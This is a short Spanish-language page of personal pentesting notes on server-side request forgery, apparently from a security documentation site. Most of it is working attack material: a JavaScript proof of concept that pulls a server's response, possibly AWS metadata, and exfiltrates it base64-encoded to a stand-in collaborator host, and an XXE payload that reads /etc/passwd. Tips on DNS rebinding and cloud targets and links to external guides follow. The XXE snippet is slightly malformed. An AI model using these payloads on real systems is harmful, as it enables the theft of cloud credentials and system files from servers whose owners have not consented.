---
title: SSRF
sidebar_position: 1
---

## Notas

https://nip.io/ -> Esto mapea a una IP o sea para no usar lit 127.0.0.1

PARA ATAQUES OOB

LEVANTA UN SERVIDOR EN CLOUD PANEL POR EJEMPLO, DENTRO DE ESE CLOUD PANEL

Contenido de poc.html

```html
<script>
    exfil = new XMLHttpRequest();
    // Set the correct server below e.g https://abcdefg.ctfio.com
    // Puedes tratar de poner en el vulnerable server metadata de AWS
    exfil.open("GET","https://vulnerable.server/data");
    exfil.send();
    // put your colab instance below to you can capture the contents of the server
    exfil.onload = function(){ document.write('<img src="https://colab_instance.com/?mamaste=' + btoa(this.responseText) + '">'); }
</script>
```

> Intenta DNS RENBINDING

> Apunta a la nube 

Para hacer un XXE desde un SSRF aloja una pagina html con contenido de xml

```xml

<?xml version "1.0" encoding="UTF-8" ?>
<! DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>
&xxe;
</search>
</root>

```


### VIA PDF

- https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators


- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#netdoc


- https://medium.com/@iski/silent-sniper-how-i-turned-a-blind-ssrf-into-a-critical-aws-infrastructure-breach-ae40614de53b